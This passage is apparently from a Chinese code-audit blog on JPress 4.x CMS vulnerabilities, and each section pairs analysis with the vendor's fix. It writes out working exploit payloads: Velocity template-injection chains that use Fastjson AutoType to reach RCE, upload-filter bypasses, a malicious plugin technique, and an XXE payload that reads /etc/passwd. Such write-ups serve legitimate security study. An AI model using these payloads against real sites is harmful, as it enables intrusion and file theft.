+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">byEmail</span><span class="params">(Article article, ArticleComment comment, User user)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">enable</span> <span class="operator">=</span> JPressOptions.getAsBool(<span class="string">&quot;article_comment_email_notify_enable&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">            fixedThreadPool.execute(() -&gt; doSendEmail(article, comment, user));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进 <code>doSendEmail()</code> 方法，它去做了 SendEmail 这个动作的具体业务实现。</p>
+<p><img src="../images/image-20250823205741609.png" alt="image-20250823205741609" /></p>
+<p><code>doSendEmail()</code> 方法前面都是一些基础赋值，到第 90 行看到了模板渲染操作，在第 90 和 91 行，分别对邮件的 emailTitle 和 emailTemplate 调用 <code>getTemplateByString()</code> 方法进行渲染，这两个变量对应 <code>#(comment.id)</code> 处的两个值。</p>
+<p><img src="../images/emailValue.png" alt="img" /></p>
+<p>分析到这里就可以打模板注入了，想了解模板注入是如何进行调用类的可以继续跟下去</p>
+<h3 id="漏洞验证黑盒"><a class="markdownIt-Anchor" href="#漏洞验证黑盒"></a> 漏洞验证(黑盒)</h3>
+<p>模拟实战情况</p>
+<p>首先通过弱口令进入后台，然后开启评论</p>
+<p>然后配置管理员邮箱，随便配一个，这个是收件者</p>
+<p><img src="../images/image-20250823211515497.png" alt="image-20250823211515497" /></p>
+<p>还得配置发送者的邮箱，<strong>配置完记得点提交，拉到最下面点提交</strong></p>
+<p><img src="../images/image-20250823211709167.png" alt="image-20250823211709167" /></p>
+<p>在 Velocity 这个模板引擎当中非常奇妙，先从模板引擎说起，师傅们都知道<strong>模板引擎有时候是可以写脚本的</strong>，可以进行一些简单的赋值与输出这类的操作。</p>
+<p>在 Velocity 中 <code>&quot;#&quot;</code> 用来标识 Velocity 的脚本语句，包括 <code>#set、#if 、#else、#end、#foreach、#end、#iinclude、#parse、#macro</code> 等；</p>
+<p>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#if($info.imgs) </span><br><span class="line">&lt;img src=&quot;$info.imgs&quot; border=0&gt; </span><br><span class="line">#else </span><br><span class="line">&lt;img src=&quot;noPhoto.jpg&quot;&gt; </span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+<p>那么在这一个 PoC 当中，我们可以借助 Fastjson 的特性辅助攻击。</p>
+<p>借用drun1baby师傅的POC，并将它插入到评论的内容当中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set(x=net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(&quot;javax.script.ScriptEngineManager&quot;))</span><br><span class="line">#set(e=x.getEngineByName(&quot;js&quot;))</span><br><span class="line">#(e.eval(&#x27;java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)&#x27;))</span><br></pre></td></tr></table></figure>
+<p><strong>POC解释：</strong></p>
+<p><code>#set</code>：Velocity 指令，用来定义变量。</p>
+<p>右边调用了 <code>net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(...)</code>：</p>
+<ul>
+<li>这里的 <code>::</code> 是 Velocity 对 <strong>静态方法调用</strong> 的语法。</li>
+<li><code>ClassLoaderUtil.createNewInstance(&quot;javax.script.ScriptEngineManager&quot;)</code> 会通过反射创建一个 <code>javax.script.ScriptEngineManager</code> 对象。</li>
+</ul>
+<p>调用 <code>x.getEngineByName(&quot;js&quot;)</code>，从 ScriptEngineManager 里取一个 <strong>JavaScript 引擎</strong></p>
+<p><code>#(...)</code> 是 Velocity 的“输出表达式”写法（等价于直接写 <code>$e.eval(...)</code>）</p>
+<p>这里调用 <code>e.eval(...)</code>，执行一段 JavaScript 脚本–&gt;弹出计算器</p>
+<p><img src="../images/image-20250823212609775.png" alt="image-20250823212609775" /></p>
+<p>按照道理来说，这里前台只要输入任意的东西，就可以造成 SSTI To RCE 这么一个效果，但是这里却抛出了异常，具体位置是在 <code>renderToString()</code> 方法调用之后抛出了异常</p>
+<p>仔细看一下报错信息：其实是在说，第三行的地方<strong>存在着不合法的字符</strong>，这个字符其实是单引号。</p>
+<p>所以这里我们需要用另外一种方式来打，<strong>尝试不使用引号构造 payload</strong>，构造出了如下 payload，我们将字符串内容通过评论内容进行传入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#set(str=comment.content)  <span class="comment">//把用户输入（评论内容）赋值给变量 str</span></span><br><span class="line">#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance())  <span class="comment">//调用 Fastjson 的 全局配置实例</span></span><br><span class="line">#(x.setAutoTypeSupport(<span class="literal">true</span>))   <span class="comment">//打开 AutoType 支持（允许反序列化时使用任意类）</span></span><br><span class="line">#set(sem=str.substring(<span class="number">0</span>, str.indexOf(<span class="number">124</span>)))  <span class="comment">//从 str 中切割出一段内容（以 ASCII 码 124 → &#x27;|&#x27; 作为分隔符）</span></span><br><span class="line">#set(str=str.substring(str.indexOf(<span class="number">124</span>)+<span class="number">1</span>))  </span><br><span class="line">#(x.addAccept(sem))   <span class="comment">//把这个包名前缀加入 Fastjson 白名单</span></span><br><span class="line">#set(json=str.substring(<span class="number">0</span>, str.indexOf(<span class="number">124</span>)))  <span class="comment">//再次用 | 切分，从 str 里取出一段 json</span></span><br><span class="line">#set(str=str.substring(str.indexOf(<span class="number">124</span>)+<span class="number">1</span>))   </span><br><span class="line">#set(x=com.alibaba.fastjson.JSON::parse(json))  <span class="comment">//调用 JSON.parse(json) 反序列化，得到一个对象赋值给 x</span></span><br><span class="line">#set(js=str.substring(<span class="number">0</span>, str.indexOf(<span class="number">124</span>)))  <span class="comment">//再切出一段，赋值给 js（实际上就是 &quot;js&quot;）</span></span><br><span class="line">#set(str=str.substring(str.indexOf(<span class="number">124</span>)+<span class="number">1</span>))  </span><br><span class="line">#set(e=x.getEngineByName(js)) </span><br><span class="line"><span class="comment">//这里的 x 前面是 Fastjson 反序列化出来的对象 → 应该是 ScriptEngineManager。</span></span><br><span class="line"><span class="comment">//所以 e 就是一个 JavaScript 引擎。</span></span><br><span class="line">#(e.eval(str))</span><br></pre></td></tr></table></figure>
+<p><strong>POC解释：</strong></p>
+<p>一个 <strong>Velocity 模板注入利用链</strong>，结合了 <strong>Fastjson 的 AutoType 绕过</strong></p>
+<p>从 <code>comment.content</code> 读取 payload 字符串（<strong>格式：<code>包名前缀|json|js|payload</code></strong>）。</p>
+<p>开启 Fastjson AutoType → 绕过安全限制。</p>
+<p>加白名单，让目标类可反序列化。</p>
+<p>反序列化构造出一个 <code>ScriptEngineManager</code>。</p>
+<p>调用 <code>getEngineByName(&quot;js&quot;)</code> 拿到 JavaScript 引擎。</p>
+<p>执行 JS 代码 → RCE。</p>
+<p><strong>关键点：</strong> 这段模板注入代码本身会被 Velocity <strong>保存进模板执行上下文</strong>，而且里面 <code>#set(str=comment.content)</code> 会持续从评论里取内容。</p>
+<hr />
+<p>因为后端在渲染模板时将 comment 对象传入了，所以我们可以获取 <code>comment.content</code>，而这个值又是在评论时可控的，配合 Fastjson 打。</p>
+<p>在评论的地方构造 payload（记得先在后台把上述POC提交再提交该payload）</p>
+<p>这条评论就被赋值到上述POC的 <code>str</code>中</p>
+<p>第一个模板注入脚本早已在引擎里生效，遇到新评论时又会被触发</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.script.ScriptEngineManager|&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>&#125;|js|java.lang.Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250823213930498.png" alt="image-20250823213930498" /></p>
+<p><img src="../images/image-20250823214103804.png" alt="image-20250823214103804" /></p>
+<p>攻击成功</p>
+<h3 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复"></a> 漏洞修复</h3>
+<p>jpress V5.0.5，也就是最新版本当中，是通过转义字符来修补这个漏洞的。挺妙的，代码量小且利用效率高，很强。它的修补手段是在 <code>getPara()</code> 方法处先做一个转义</p>
+<p><img src="../images/cleanXSSDefendSSTI.png" alt="img" /></p>
+<p>跟进 <code>escapeHtml()</code> 方法，它调用了 <code>replaceEach()</code> 方法，<code>replaceEach()</code> 方法做了转义恶意字符的工作</p>
+<p><img src="../images/replaceEach.png" alt="img" /></p>
+<h2 id="前台任意文件上传漏洞"><a class="markdownIt-Anchor" href="#前台任意文件上传漏洞"></a> 前台任意文件上传漏洞</h2>
+<h3 id="影响接口-2"><a class="markdownIt-Anchor" href="#影响接口-2"></a> 影响接口</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ucenter/avatar</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞分析白盒-2"><a class="markdownIt-Anchor" href="#漏洞分析白盒-2"></a> 漏洞分析(白盒)</h3>
+<p>漏洞影响域在 <code>/ucenter/avatar</code> 下，这里对应的接口找了很久，最后终于找到是在 <code>io.jpress.web.commons.controller.AttachmentController#upload</code> 处</p>
+<p>产生漏洞的根本原因是，Web 应用程序允许上传一个 <code>file[]</code> 数组，而非单个文件，从而我们可以构造多个文件同时上传来绕过。</p>
+<p><img src="../images/uploadFileArray.png" alt="img" /></p>
+<p>具体的运行流程分析如下，先把断点下在 <code>upload()</code> 方法处</p>
+<p>一开始获取文件，并将第 0 个元素赋给 file</p>
+<p><img src="../images/GetFileIndexZero.png" alt="img" /></p>
+<p>在执行完 <code>getFile</code> 之后，可以看到，我们上传的文件已经被保存到了临时文件目录，也就是 attachment 目录下，这其实就是一个暂存的动作。</p>
+<p><img src="../images/image-20250823223511268.png" alt="image-20250823223511268" /></p>
+<p>紧接着，在65行，判断了文件是否合法，不合法就删除，对应的黑名单在 <code>unSafe()</code> 方法里面。</p>
+<p><img src="https://drun1baby.top/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/UnSafe.png" alt="img" /></p>
+<p><img src="../images/image-20250823223626882.png" alt="image-20250823223626882" /></p>
+<p>接着往下走，进行了是否是 image 这个类型的判断，如果是 image 这个类型，则会限制上传的 image 大小。</p>
+<p>然后就没了，可以看出对文件上传没多少限制，<strong>对于unsafe中的黑名单：</strong></p>
+<p><strong>我们可以上传多个文件（都会存储到临时文件目录），但是最后只检查了第一个文件，如果不合法就删除，其他文件是不会受影响的。</strong></p>
+<h3 id="漏洞验证黑盒-2"><a class="markdownIt-Anchor" href="#漏洞验证黑盒-2"></a> 漏洞验证(黑盒)</h3>
+<p>这里提供一点黑盒测试的思路，先判断是什么校验，如果是文件后缀校验的话，可以尝试上传一个未知后缀的文件判断是黑名单还是白名单，如果是黑就可以尝试绕过，白名单的话黑盒情况下基本GG</p>
+<hr />
+<p>先创建一个普通用户</p>
+<p><img src="../images/image-20250823215435817.png" alt="image-20250823215435817" /></p>
+<p><img src="../images/image-20250823215532689.png" alt="image-20250823215532689" /></p>
+<p>随便上传并抓包</p>
+<p>正常请求是这样的：</p>
+<p><img src="../images/image-20250823224451536.png" alt="image-20250823224451536" /></p>
+<p>然后都会保存到临时目录中</p>
+<p>我们这里上传一个黑名单中的html文件</p>
+<p><img src="../images/image-20250823225037528.png" alt="image-20250823225037528" /></p>
+<p>显示失败</p>
+<p>这里有两种方法可以绕过黑名单过滤：</p>
+<h4 id="法一-多文件上传绕过"><a class="markdownIt-Anchor" href="#法一-多文件上传绕过"></a> 法一 多文件上传绕过</h4>
+<p>修改数据包，把图片文件放前面，恶意文件放后面</p>
+<p>上传</p>
+<p><img src="../images/image-20250823225421588.png" alt="image-20250823225421588" /></p>
+<p>成功，看后端</p>
+<p><img src="../images/image-20250823225454435.png" alt="image-20250823225454435" /></p>
+<p>可以看到html文件也被上传成功了</p>
+<p><img src="../images/image-20250823230123013.png" alt="image-20250823230123013" /></p>
+<h4 id="法二-window下的绕过"><a class="markdownIt-Anchor" href="#法二-window下的绕过"></a> 法二 Window下的绕过</h4>
+<p>因为这个是在我Window本地搭建的，所以有很多种Window下绕过的思路，什么截断符等等</p>
+<p>我这里直接用<code>::$DATA</code>截断符</p>
+<p><img src="../images/image-20250823225954490.png" alt="image-20250823225954490" /></p>
+<p><img src="../images/image-20250823230005725.png" alt="image-20250823230005725" /></p>
+<p>上传成功</p>
+<h4 id="注意-filter"><a class="markdownIt-Anchor" href="#注意-filter"></a> 注意 Filter</h4>
+<p>这里我们把html换为JSP文件上传</p>
+<p>上传成功后，访问</p>
+<p><img src="../images/image-20250823230220859.png" alt="image-20250823230220859" /></p>
+<p>发现报错了，返回500了，这里可以得知文件是存在的，但是被拦截了，想都不用想，是Filter干的好事</p>
+<p>我们去找一下它的Filter</p>
+<p><img src="../images/image-20250823231152586.png" alt="image-20250823231152586" /></p>
+<p><img src="../images/image-20250823231205076.png" alt="image-20250823231205076" /></p>
+<p>在Filer中定义了不允许请求jsp和jspx文件，那么我们只能尝试上传其它后缀的jsp尝试绕过了（例如:<code>.jspf</code>）</p>
+<p>这里懒得搞了，拿大佬的图：</p>
+<p><img src="../images/8-1729774930.png" alt="JAVA代审-JPress_V4.2" /></p>
+<p><img src="../images/7-1729774931.png" alt="JAVA代审-JPress_V4.2" /></p>
+<h3 id="漏洞修复-2"><a class="markdownIt-Anchor" href="#漏洞修复-2"></a> 漏洞修复</h3>
+<p>官方的修复方式是对业务影响最小的修复方式，我们可以来看一看 jpress V5.0.5 的代码</p>
+<p><img src="../images/uploadFilesJudge.png" alt="img" /></p>
+<p>先判断在数组文件当中，是否只有一个文件，如果只有一个文件，那么就通过 <code>get(0)</code> 获取到它，如果有多个文件，就将多个文件直接执行 delete 操作。</p>
+<p>也就防止了多文件上传，至于Window，应该很少人会在这上面部署吧</p>
+<h2 id="前台任意文件上传漏洞2"><a class="markdownIt-Anchor" href="#前台任意文件上传漏洞2"></a> 前台任意文件上传漏洞2</h2>
+<p>发现文章投稿处可以上传缩略图</p>
+<p><img src="../images/image-20250823231830544.png" alt="image-20250823231830544" /></p>
+<p>抓包</p>
+<p><img src="../images/image-20250823231916295.png" alt="image-20250823231916295" /></p>
+<p>和第一个一样的</p>
+<p><img src="../images/image-20250823231948067.png" alt="image-20250823231948067" /></p>
+<h2 id="插件安装导致rce"><a class="markdownIt-Anchor" href="#插件安装导致rce"></a> 插件安装导致RCE</h2>
+<h3 id="影响接口-3"><a class="markdownIt-Anchor" href="#影响接口-3"></a> 影响接口</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/addon/install</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞分析白盒-3"><a class="markdownIt-Anchor" href="#漏洞分析白盒-3"></a> 漏洞分析(白盒)</h3>
+<p>此处允许我们上传 jar 包，并不是允许上传 jar 包就一定会存在漏洞，具体漏洞的情况还要看内部有没有进行一些过滤的手法。</p>
+<p>找了很久对应的接口，最后发现是在 <code>io.jpress.web.admin._AddonController</code> 的<code>doUploadAndInstall()</code> 方法下做的对应业务。</p>
+<p><img src="../images/image-20250823235859056.png" alt="image-20250823235859056" /></p>
+<p>这里也是一个文件上传点，所以依旧会存在多个文件绕过的方式</p>
+<p>继续看</p>
+<p>在获取到文件后，会判断是否是 zip 或是 jar 的文件类型。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddonInfo addon = AddonUtil.readSimpleAddonInfo(ufile.getFile());</span><br></pre></td></tr></table></figure>
+<p>关键语句在 <code>readSimpleAddonInfo()</code> 处，<code>readSimpleAddonInfo()</code> 方法会把我们所有的东西保存到一个 Zip 包里面，当然 jar 包后续会打包成 jar 包。</p>
+<p>继续往下走，直接看安装部分：到第 118 行，这一个 <code>install()</code> 方法相当关键</p>
+<p><img src="../images/image-20250824000208444.png" alt="image-20250824000208444" /></p>
+<p>跟进<code>AddonManager.me().install(newAddonFile)</code>方法</p>
+<p><img src="../images/image-20250824000332749.png" alt="image-20250824000332749" /></p>
+<p>在这个方法中，先调用了一下<code>AddonUtil.readAddonInfo</code>读取插件信息</p>
+<p>跟进<code>AddonUtil.readAddonInfo</code>，在这个方法里面会创建一个类加载器来加载插件里的类</p>
+<p><img src="../images/image-20250824000410428.png" alt="image-20250824000410428" /></p>
+<p>跟进<code>classLoader.load()</code></p>
+<p><img src="../images/image-20250824000450329.png" alt="image-20250824000450329" /></p>
+<p><img src="../images/image-20250824000521878.png" alt="image-20250824000521878" /></p>
+<p>这个方法的作用就是先加载类，然后把不同的类进行归类，Controller归到一起，Interceptor归到一起，根据类的功能进行归类，把他们分别添加到了 addonInfo 的特定字段当中</p>
+<h3 id="漏洞验证黑盒-3"><a class="markdownIt-Anchor" href="#漏洞验证黑盒-3"></a> 漏洞验证(黑盒)</h3>
+<p>通过弱口令进入后台</p>
+<p>来到插件安装处</p>
+<p><img src="../images/image-20250824000726391.png" alt="image-20250824000726391" /></p>
+<p>然后编写一个恶意jar包</p>
+<p>本地的话我们直接利用本地项目就好了</p>
+<p><img src="../images/image-20250824001210254.png" alt="image-20250824001210254" /></p>
+<p>在helloworld文件添加一个静态代码块，里面写上恶意代码</p>
+<p>然后打包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\代码审计系统\jpress-4.2.0\jpress-addons\jpress-addon-helloworld&gt; mvn clean package   </span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250824001912541.png" alt="image-20250824001912541" /></p>
+<p>然后选择这个jar文件上传</p>
+<p><img src="../images/image-20250824002029541.png" alt="image-20250824002029541" /></p>
+<p>然后访问对应路由：</p>
+<p><img src="../images/image-20250824002105407.png" alt="image-20250824002105407" /></p>
+<p>黑盒中恶意文件可以自己编写</p>
+<h3 id="漏洞修复-3"><a class="markdownIt-Anchor" href="#漏洞修复-3"></a> 漏洞修复</h3>
+<ul>
+<li>官方作者这里并没有给出对应的修复方法……对应的解释如下</li>
+</ul>
+<p>“不处理这个问题，原因是：<br />
+1、必须获得 JPress 的后台登录地址，虽然有默认的登录地址，但是可配置成其他复杂的地址<br />
+2、拥有登录地址后，必须有管理员的账号和密码，这种一般只有设置了弱密码，或者管理员主动泄漏。<br />
+3、安装了 恶意 的插件</p>
+<p>而目前 Java 行业凡是对于可以安装插件的产品来讲，都是无法避免这个问题的。这个需要网站管理提高安全意识、设置复杂的登录地址和登录账号密码，不轻易安装不认可的插件即可解决。这种由于安全意识造成的问题，并非软件问题。”</p>
+<blockquote>
+<p>其实还是蛮能理解的……</p>
+</blockquote>
+<p>所以此处我认为并没有比较合适的修复手段……</p>
+<h2 id="模板安装导致rce"><a class="markdownIt-Anchor" href="#模板安装导致rce"></a> 模板安装导致RCE</h2>
+<h3 id="影响接口-4"><a class="markdownIt-Anchor" href="#影响接口-4"></a> 影响接口</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/template/install</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250824161142677.png" alt="image-20250824161142677" /></p>
+<h3 id="漏洞分析白盒-4"><a class="markdownIt-Anchor" href="#漏洞分析白盒-4"></a> 漏洞分析(白盒)</h3>
+<p>在<code>io.jpress.web.admin._TemplateController</code> 下的 <code>doInstall()</code> 方法</p>
+<p><img src="../images/image-20250824161247530.png" alt="image-20250824161247530" /></p>
+<p>检查是不是zip，文件是否已经存在等，</p>
+<p>到 155 行，155 行这里实际上做了一个文件 move 的操作，将文件先 “暂存”到了对应的文件夹下</p>
+<p>最后来到156行，解压zip，然后这个方法就基本结束了。</p>
+<p><img src="../images/image-20250824161520075.png" alt="image-20250824161520075" /></p>
+<h3 id="漏洞验证黑盒-4"><a class="markdownIt-Anchor" href="#漏洞验证黑盒-4"></a> 漏洞验证(黑盒)</h3>
+<p>例如，我们创建一个index.php，然后压缩为zip</p>
+<p>上传</p>
+<p>然后就被保存到了这里，创建了一个index文件夹</p>
+<p><img src="../images/image-20250824162240561.png" alt="image-20250824162240561" /></p>
+<p>不过模板注入存在些许过滤，我们使用 Fastjson 来辅助获取 <code>ScriptEngineManager</code>，然后执行任意 js 代码，就可以实现 rce，payload 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance()) </span><br><span class="line">#(x.setAutoTypeSupport(true)) </span><br><span class="line">#(x.addAccept(&quot;javax.script.ScriptEngineManager&quot;)) </span><br><span class="line">#set(x=com.alibaba.fastjson.JSON::parse(&#x27;&#123;&quot;@type&quot;:&quot;javax.script.ScriptEngineManager&quot;&#125;&#x27;))</span><br><span class="line">#set(e=x.getEngineByName(&quot;js&quot;)) </span><br><span class="line">#(e.eval(&#x27;java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)&#x27;))</span><br></pre></td></tr></table></figure>
+<p>后台这个地方存在一个模板预览功能，这就用到了利用方式</p>
+<p><img src="../images/image-20250824162343216.png" alt="image-20250824162343216" /></p>
+<p>开启之后可以通过 get 传入 template 参数来指定使用的模板，比如这里我们指定使用 <code>cn.jeanstudio.bonhumeur</code> 这个模板。</p>
+<p><img src="../images/image-20250824162456195.png" alt="image-20250824162456195" /></p>
+<p>而因为我们上传的是一个 html，所以我们可以直接访问 evil/?template=evil 来攻击</p>
+<p><img src="../images/EvilInstallTemplates.png" alt="img" /></p>
+<h3 id="漏洞修复-4"><a class="markdownIt-Anchor" href="#漏洞修复-4"></a> 漏洞修复</h3>
+<p>禁止了在 html 中使用 <code>#set</code> 的调用，所以我们恶意的 payload 无法打成功</p>
+<h2 id="从wordpress中导入文章功能存在xxe漏洞-v412"><a class="markdownIt-Anchor" href="#从wordpress中导入文章功能存在xxe漏洞-v412"></a> 从WordPress中导入文章功能存在XXE漏洞-V4.1.2</h2>
+<p><strong>(在对应的低版本可以，V4-2-不行)</strong></p>
+<h3 id="影响接口-5"><a class="markdownIt-Anchor" href="#影响接口-5"></a> 影响接口</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/setting/tools/wordpress</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250824165027293.png" alt="image-20250824165027293" /></p>
+<p><img src="../images/image-20250824165035862.png" alt="image-20250824165035862" /></p>
+<h3 id="漏洞分析白盒-5"><a class="markdownIt-Anchor" href="#漏洞分析白盒-5"></a> 漏洞分析(白盒)</h3>
+<p>对应的业务点在 <code>io.jpress.module.article.controller.admin._WordpressImport#doWordPressImport</code> 处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\jpress-4.2.0\module-article\module-article-web\src\main\java\io\jpress\module\article\controller\admin\_WordpressImport</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250824165725071.png" alt="image-20250824165725071" /></p>
+<p>同样，这也是一个文件上传点，前面的就不看了，直接看 xml 解析的部分。</p>
+<p><img src="../images/image-20250824165804580.png" alt="image-20250824165804580" /></p>
+<p>跟进 <code>wordPressXmlParser.parse()</code>，里面就是正常的 XML 解析业务，但同时可以发现，此处禁止了 DTD 的使用，所以 V4.2 版本这里是不存在漏洞的。</p>
+<p><img src="../images/image-20250824165842511.png" alt="image-20250824165842511" /></p>
+<p>我们来看一看 V4.1.2 也就是存在漏洞的版本中的代码。</p>
+<p><img src="../images/412WordPressImport.png" alt="img" /></p>
+<p>V 4.1.2 版本当中未过滤任意 DTD，所以能够造成 XXE 漏洞攻击。</p>
+<p>payload 如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wp:post_type</span>&gt;</span>post<span class="tag">&lt;/<span class="name">wp:post_type</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">content:encoded</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">content:encoded</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wp:status</span>&gt;</span>draft<span class="tag">&lt;/<span class="name">wp:status</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞修复-5"><a class="markdownIt-Anchor" href="#漏洞修复-5"></a> 漏洞修复</h3>
+<p>禁用 DTD，代码可以参照 V4.2 版本的当中的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SAXParserFactory.newInstance();</span><br><span class="line">            factory.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">            factory.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            factory.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            factory.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            factory.setXIncludeAware(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="后台存在命令执行漏洞-模板修改"><a class="markdownIt-Anchor" href="#后台存在命令执行漏洞-模板修改"></a> 后台存在命令执行漏洞-模板修改</h2>
+<h3 id="影响接口-6"><a class="markdownIt-Anchor" href="#影响接口-6"></a> 影响接口</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/template/edit</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250824170907436.png" alt="image-20250824170907436" /></p>
+<h3 id="漏洞验证黑盒-5"><a class="markdownIt-Anchor" href="#漏洞验证黑盒-5"></a> 漏洞验证(黑盒)</h3>
+<p>没做Filter，就不分析源码了</p>
+<p>弱口令进入后台：</p>
+<p>jpress后台存在模板编辑功能，不过存在些许过滤，我们使用fastjson来辅助获取<code>ScriptEngineManager</code>，然后执行任意js代码，就可以实现rce，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance()) </span><br><span class="line">#(x.setAutoTypeSupport(true)) #(x.addAccept(&quot;javax.script.ScriptEngineManager&quot;)) </span><br><span class="line">#set(x=com.alibaba.fastjson.JSON::parse(&#x27;&#123;&quot;@type&quot;:&quot;javax.script.ScriptEngineManager&quot;&#125;&#x27;))</span><br><span class="line">#set(e=x.getEngineByName(&quot;js&quot;)) </span><br><span class="line">#(e.eval(&#x27;java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)&#x27;))</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250824171028666.png" alt="image-20250824171028666" /></p>
+<p>然后更新文件</p>
+<p>访问文章：/article/1</p>
+<p><img src="../images/image-20250824171103149.png" alt="image-20250824171103149" /></p>
+<p>成功RCE</p>
+<p>当然，也可以插入XSS代码，但我们都进后台了，用XSS也没啥用了</p>
+<h3 id="漏洞修复-6"><a class="markdownIt-Anchor" href="#漏洞修复-6"></a> 漏洞修复</h3>
